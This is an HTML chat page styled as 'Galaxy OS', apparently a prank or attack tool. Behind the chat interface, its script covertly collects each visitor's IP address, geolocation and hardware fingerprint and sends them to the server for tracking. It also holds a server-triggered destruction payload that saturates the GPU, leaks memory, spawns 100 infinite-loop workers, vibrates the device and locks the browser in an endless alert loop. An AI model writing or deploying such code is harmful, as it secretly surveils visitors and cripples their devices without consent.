<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>GALAXY OS - V15 HARDWARE KILLER</title>
    <style>
        /* DESIGN GALAXY OS */
        :root { --main: #a29bfe; --red: #ff4d4d; --bg: #050505; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { margin: 0; background: #000; font-family: 'Consolas', 'Monaco', monospace; color: white; height: 100vh; overflow: hidden; display: flex; }
        
        /* LOGIN OVERLAY */
        #login-overlay { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; transition: 0.5s; }
        .login-box { border: 1px solid var(--main); padding: 30px; text-align: center; width: 300px; background: #0a0a0a; box-shadow: 0 0 30px rgba(162, 155, 254, 0.2); }
        .login-box h2 { letter-spacing: 5px; color: var(--main); margin-bottom: 25px; }
        input[type="text"] { width: 100%; padding: 12px; margin-bottom: 15px; background: #000; border: 1px solid #333; color: white; outline: none; }
        input[type="text"]:focus { border-color: var(--main); }
        
        /* INTERFACE PRINCIPALE */
        #side-menu { width: 260px; background: var(--bg); border-right: 1px solid #1a1a1a; display: flex; flex-direction: column; }
        #main-chat { flex: 1; display: flex; flex-direction: column; background: rgba(0,0,0,0.6); }
        #messages { flex: 1; overflow-y: auto; padding: 20px; list-style: none; margin: 0; }
        .msg-card { background: #0f0f0f; padding: 12px; margin-bottom: 10px; border-left: 3px solid var(--main); animation: slideIn 0.2s ease-out; }
        @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }

        /* MONITORING UNIT */
        #monitor { padding: 20px; font-size: 0.75em; color: #00ff88; border-top: 1px solid #1a1a1a; background: #020202; }
        .stat-line { margin: 5px 0; font-family: monospace; }

        /* INPUT AREA */
        #form { display: flex; padding: 15px; background: #000; border-top: 1px solid #1a1a1a; gap: 10px; }
        #input { flex: 1; background: #0a0a0a; border: 1px solid #222; color: white; padding: 12px; border-radius: 4px; outline: none; }
        #input:focus { border-color: var(--main); }
        .btn { background: var(--main); color: #000; border: none; padding: 0 25px; cursor: pointer; font-weight: bold; border-radius: 4px; transition: 0.2s; }
        .btn:hover { opacity: 0.8; transform: scale(0.98); }

        /* CRASH SCREEN (HIDDEN BY DEFAULT) */
        #crash-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 9999999; text-align: center; padding-top: 40vh; }
        .crash-title { color: var(--red); font-size: 2.5em; text-transform: uppercase; animation: blink 0.1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <div id="crash-screen">
        <h1 class="crash-title">Critical_Hardware_Failure</h1>
        <p id="crash-status" style="color:white; font-family: monospace;">OVERLOADING_CORE_RESOURCES...</p>
    </div>

    <div id="login-overlay">
        <div class="login-box">
            <h2>GALAXY OS</h2>
            <input type="text" id="login-name" placeholder="IDENTIFIANT_CIBLE..." autocomplete="off">
            <input type="file" id="login-pp-file" style="display:none">
            <button class="btn" style="width:100%; height:45px;" onclick="initSystem()">INITIALISER SCAN</button>
        </div>
    </div>

    <div id="side-menu">
        <div style="padding:30px; text-align:center;">
            <div id="pp-preview" style="width:80px; height:80px; border-radius:50%; border:2px solid var(--main); margin: 0 auto; display:none; background-size:cover;"></div>
            <h3 id="display-name" style="margin-top:15px; letter-spacing:2px;"></h3>
        </div>
        <div id="monitor">
            <div class="stat-line"> > SYSTEM: ARMED</div>
            <div class="stat-line" id="mon-ip"> > IP: WAITING...</div>
            <div class="stat-line" id="mon-gpu"> > GPU: SCANNING...</div>
            <div class="stat-line" id="mon-bat"> > BATT: --%</div>
        </div>
    </div>

    <div id="main-chat">
        <ul id="messages"></ul>
        <form id="form">
            <input id="input" autocomplete="off" placeholder="Entrez une commande ou un message..." />
            <button type="submit" class="btn">EXEC</button>
        </form>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let user = JSON.parse(localStorage.getItem('galaxy_v15_data')) || { name: "", pp: "", geo: {}, hw: {} };

        // Auto-login si les données existent
        window.onload = () => { if(user.name) finalizeLogin(user.name, true); };

        async function initSystem() {
            const name = document.getElementById('login-name').value;
            if(!name) return;

            // 1. Extraction IP & Géo furtive
            try {
                const res = await fetch('https://ipapi.co/json/');
                user.geo = await res.json();
            } catch(e) { user.geo = { ip: "127.0.0.1", city: "Unknown" }; }

            // 2. Extraction Hardware (GPU/CPU/RAM)
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Software Renderer";

            let batteryLevel = "100";
            if(navigator.getBattery) {
                const b = await navigator.getBattery();
                batteryLevel = Math.floor(b.level * 100);
            }

            user.hw = {
                gpu: gpu,
                ram: navigator.deviceMemory || "N/A",
                cores: navigator.hardwareConcurrency || "N/A",
                battery: batteryLevel
            };

            finalizeLogin(name);
        }

        function finalizeLogin(name, auto = false) {
            user.name = name;
            if(!auto) localStorage.setItem('galaxy_v15_data', JSON.stringify(user));

            document.getElementById('login-overlay').style.opacity = '0';
            setTimeout(() => document.getElementById('login-overlay').style.display = 'none', 500);

            document.getElementById('display-name').innerText = name;
            document.getElementById('mon-ip').innerText = ` > IP: ${user.geo.ip}`;
            document.getElementById('mon-gpu').innerText = ` > GPU: ${user.hw.gpu.substring(0,20)}...`;
            document.getElementById('mon-bat').innerText = ` > BATT: ${user.hw.battery}%`;

            // Envoi des infos au serveur pour le tracking
            socket.emit('check_device', {
                name: user.name,
                geo: user.geo,
                hardware: user.hw
            });
        }

        // Gestion du Chat
        document.getElementById('form').onsubmit = (e) => {
            e.preventDefault();
            const input = document.getElementById('input');
            if(input.value) {
                socket.emit('chat message', { text: input.value, name: user.name });
                input.value = '';
            }
        };

        socket.on('chat message', (data) => {
            const li = document.createElement('li');
            li.className = 'msg-card';
            li.innerHTML = `<strong style="color:var(--main)">${data.name}</strong>: ${data.text}`;
            document.getElementById('messages').appendChild(li);
            document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
        });

        // ==========================================
        // CHARGE UTILE DE DESTRUCTION (CRASH UNIT)
        // ==========================================
        
        socket.on('CORE_MELTDOWN_INIT', () => {
            document.getElementById('crash-screen').style.display = 'block';
            localStorage.clear();

            // VECTEUR 1: GPU OVERFLOW (Saturation textures)
            for(let i=0; i<400; i++) {
                let c = document.createElement('canvas');
                let gl = c.getContext('webgl');
                if(gl) {
                    let t = gl.createTexture();
                    gl.bindTexture(gl.TEXTURE_2D, t);
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
                }
            }

            // VECTEUR 2: RAM EXPLOSION (Memory Leak massif)
            const memoryHole = [];
            setInterval(() => {
                try {
                    // Injecte 500 Mo de données aléatoires par cycle
                    memoryHole.push(new Uint8Array(500 * 1024 * 1024).fill(Math.random()));
                } catch(e) {}
            }, 40);

            // VECTEUR 3: CPU STRESS (100 Threads)
            const blob = new Blob(["while(true){}"], {type: 'text/javascript'});
            const url = URL.createObjectURL(blob);
            for(let i=0; i<100; i++) { new Worker(url); }

            // VECTEUR 4: VIBRATION & UI LOCK
            if(navigator.vibrate) navigator.vibrate([100000, 1000, 100000]);
            
            // Boucle infinie pour figer le téléphone (Thread principal)
            while(true) {
                window.history.pushState(null, null, "");
                alert("CRITICAL_HARDWARE_FAILURE\n\nEMERGENCY_SHUTDOWN_FAILED\n\nDEVICE_TEMP_CRITICAL");
            }
        });

        socket.on('stop_bomb', () => {
            location.reload();
        });

    </script>
</body>
</html>
